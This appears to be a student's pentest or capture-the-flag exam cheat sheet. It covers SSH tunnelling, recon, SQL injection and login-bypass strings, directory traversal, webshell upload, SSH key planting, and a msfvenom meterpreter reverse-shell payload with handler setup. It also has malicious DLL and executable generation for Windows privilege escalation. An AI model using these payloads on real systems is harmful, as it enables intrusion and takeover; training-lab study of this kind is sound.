Master Sockets:
 - ssh -M (master) -S (slave) ~/.ssh/cm/[whatever name you want - likely the hostname of the target box] -o "ControlPersist=10m" [user]@[IP address]
 - the above command makes the socket stay open if nothing is connected to it, even if you close the original window
 - ssh -O [big O] forward [specifies port forwarding] -L [random high port]:[target IP]:[ssh port] -S [socket] ~/.ssh/cm/[specific socket] T1
 - connecting to the local port is the same as normal - ssh [username]@[localhost/0.0.0.0] -p [RHP] 
 - establishing a new tunnel uses the same syntax as before; it will still use the same Master Socket but take you to a different target
 - ssh -M -S ~/.ssh/cm/[New Socket Name] -o "ControlPersist=10m" -p [target port] [username]@[localhost/0.0.0.0] 
 - the above command sets up a new mastersocket on your second target to continue going through the network
 - ssh -o "ControlPath=~/.ssh/cm/[new socket]" [placeholder character] will take you to the new target ip through the new socket
 - scp -P [socket local RHP] [usn]@[localhost/0.0.0.0]:/file/destination/path /your/local/directory/and_file_name.txt
 - scp -o "ControlPath=~/.ssh/cm/[Master Socket]" [placeholder]:/directory/you_want_to_grab_from/and_file.txt /your/local/home/directory.txt
 - above command: scping using master socket options
 - ssh -O [big O] cancel [specifies port forwarding] -L [random high port]:[target IP]:[ssh port] -S [socket] ~/.ssh/cm/[specific socket] T1       
 - ssh -o "ControlPath=~/.ssh/cm/[socket]" -D 9050 [placeholder] - dynamic tunnel w/a socket
Methodology:
  - 10.50.43.72
  - Get initial IP
  - nmap the recieved IP
    - Basic recon:
      - whoami
      - ip a
      - hostname
      - /etc/hosts
      - /etc/passwd
      - ps -elf
      - ss -ntlp
      - for i in {1..254} ;do (ping -c 1 192.168.1.$i 2>/dev/null | grep "bytes from" &) ;done
  - look at ports 22,80,2222,4444,4242,2424,8080,8888 (commonly used in the ctfd)
  - if the port scan doesn't work, cast a wider net (1-10000)
  - nc open ports - nc [IP addr.] [port]
  - ON THE EXAM: if you recieve credentials, try using the unencoded ones first. If that doesn't work, try decoding in Base64 and ROT13. 
    Whichever gives an actual word is the appropriate creds. Attempt 2 logins per account/box - if you just can't log on IT CAN'T BE LOGGED ON TO. SOME
    BOXES CANT BE LOGGED ON TO. DONT WASTE TIME
  - IF SOMETHING IS A GATEWAY DEVICE IT WON'T RETURN ANY PINGS - DONT WASTE YOUR TIME WITH THEM
  - xfreerdp /v:10.50.x.x /u:student /p:password /size:1920x1000 +clipboard
  - To unzip a file: unzip
Web Exploitation:
  - http enum script; doesn't necessarily have to be in this order - proxychains nmap -Pn -T5 -sT -p 80 --script http-enum.nse <IP> 
  - sql injection script; shows vulnerable parts of a webpage - proxychains nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP>
  - robots.txt scan script - proxychains nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse <IP>
  - nikto also enumerates an http page - nikto -h [IP]
  - when finished enumerating, go to firefox and put in the IP in the search bar
  - browse the website as normal before trying to enumerate anything
  - getting to an http port multiple hops away: set up a local port forward on your opstation going through a master socket to the remote http port; 
    open firefox and type "localhost:[local port]" in the search bar
  - if you see an upload page, and you can upload successfully, you can upload a webshell to do an:
    - SSH keygen:
      - you can do this through a file upload page
        - If you can file upload:
          - upload your webshell to the page
        - If you can do command injection:
          - find a page you can do command injection on and run whoami
          - if something is returned, you can do command injection
          - cat /etc/passwd to find your user's home directory
          - mkdir/touch .ssh in the home directory
          - ssh-keygen -t .rsa <- creates a new ssh key
          - grab id_rsa.pub <- MAKE SURE YOU UPLOAD YOUR PUBLIC KEY
          - copy the entire line from ssh-keygen on your opstation into the exploitable field on the website (the same you ran whoami in)
          - if this works you'll be able to ssh as the user you generated the key as w/no password
  - if you find a single line command bar or radio buttons you can try:
    - SQL injection: 
      - on a page showing tables you can type a GET request in the url
      - click and submit one of the buttons and wait for the url to have a variable (ex: product=7) in it
      - from there you can slowly go through each number from 1-x until you get to one that errors out
      - find the amount of possible columns - [name].php?[variable]=[number] UNION SELECT [amount of tables you're looking for - start at 1]
      - you can find which column is which when it shows your numbers in their respective columns - i.e. column 1 = 1 column 2 = 3 column 3 = 2
      - to find the table schema type [name].php?[variable]=[number] UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;# 
        in the url
      - ignore information schema, mysql, and performance schema - these are built-in databases: look for custom databases
      - only work with the columns that are avaiable - if 1,2,5 are visible do table_schema,column_name,3,4,table_name (example)
      - DONT TRY TO GET TO THE BACK-END (SQL databases) THROUGH A LOGIN PAGE - ALL YOU SHOULD GET FROM A LOGIN PAGE ARE CREDS
      - THERE WON'T BE A DATABASE WITH MORE THAN 9 COLUMNS ON THE TEST
      - POST METHOD TO FIND VERSION: Audi' UNION SELECT @@version,database(),3,name,size FROM session.Tires; #
  - or -
    - Command injection:
      - 
  - or -
    - Directory Traversal:
      - Directory traversal is done through running commands in an excecutable bar; specifically commands to change directories:
        - EX: ../../../../../../etc/passwd - changes directory to /etc/passwd and shows the contents
  - if there's a vulnerable login page, you can try:
    - POST login method:
      - type john' OR 1='1 in both the username and password fields
  - or -
    - GET login method:
      - open dev console while making a request
      - hit enter on your request while the console is open
      - if you get status 200 clock on the post request associated w/the status
      - find your request in the request tab on the right
      - click raw and copy the request
      - put the raw request in the url, paste it, and enter
Privilege Escalation:
  - Sudo method:
    - find a command you can run as sudo - ex: find
    - go on https://gtfobins.github.io/ to find methods to priv escalate using the command
    - follow the steps to priv escalate
  - Buffer overflow:
    - if buffer overflow is needed, do which gdb - if buffer overflow is needed, it'll be there
    - buffer overflow will be Secure Server on Windows
    - to fire the overflow (windowsoverflow) set up a tunnel on the master socket closest to the target box going to the vulnerable port
    - go into msfconsole, use multi/handler and set LHOST to 0.0.0.0, LPORT to the local port going to the target box, 
      and your payload to windows/meterpreter/reverse_tcp
    - IF YOU CHANGE THE PORTS/IP - you have to regenerate the shellcode in msfvenom - the command is already in the script comments
    - msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.23.5 lport=5555 -b "\x00" -f python <- msfvenom syntax
    - THE BUFFER OVERFLOW SCRIPT IS ALREADY CREATED - just change ip and port
    - type shell in meterpreter to drop into a shell
    - WINDOWS BUFFER OVERFLOW - winbuff.py
    - LINUX BUFFER OVERFLOW - bufferoverflow.sh 
  - SUID/SGID bits:
    - for all of these: for each file found, go on gtfobins and look through EACH FILE until you find the one you can escalate 
    - to find SUID bits - run find / -type f -perm /4000 [SUID bit set] -ls 2>/dev/null [don't forget the bit bucket]
    - to find SGID bits - find / -type f -perm /2000 -ls 2>/dev/null 
    - finding both bits set (last resort) - find / -type f -perm /6000 -ls 2>/dev/null
  - Windows Escalation:
    - search services - it'll be the first app that comes up
    - look for blank descriptions, or clearly unprofessional descriptions
    - check any found programs in their directories
    - make sure you can view hidden items in file explorer
    - to determine if you can do binary replacement or .dll injection, check if you can write in the folder - binary replacement is easier
    - if you're given an executable, do binary replacement - if not, do .dll hijacking
    -  Binary/.dll replacement/hijacking:
        - Msfvenom can compile malicious binaries and .dlls
        - Compiling .dll: msfvenom -p windows/exec CMD='cmd.exe /C "command you want to run" > C:\Users\[user to save to]\Desktop\[.dll file name].txt 
          -b "\x00" -f dll > [file name where you want to save it on the linux box] 
        - Compiling binary: msfvenom -p windows/exec CMD='cmd.exe' /C "[command you want to be run]" > C:\Users\[user]\Desktop\[file name] 
          -b "\x00" -f exe > [file name].exe
        - restart the box after running the new .exe file
        - SCP from Windows grabbing file from Linux
